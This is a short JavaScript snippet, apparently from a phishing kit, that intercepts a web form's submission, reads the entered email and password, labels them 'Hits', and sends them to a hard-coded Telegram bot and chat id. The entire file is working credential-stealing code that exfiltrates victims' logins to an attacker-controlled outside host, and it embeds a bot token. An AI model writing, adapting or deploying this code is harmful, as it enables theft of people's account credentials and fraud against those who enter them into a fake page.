const form = document.querySelector("#form");

addEventListener("submit", (e) => {
  e.preventDefault();

  var email = document.getElementById("email").value;
  var pass = document.getElementById("pass").value;

  var message = "Hits :%0A" + email + ":" + pass;

  var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
  var chat_id = 1430266005;
  var url =
    "https://api.telegram.org/bot" +
    token +
    "/sendMessage?chat_id=" +
    chat_id +
    "&text=" +
    message;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  console.log("Successfully");
});
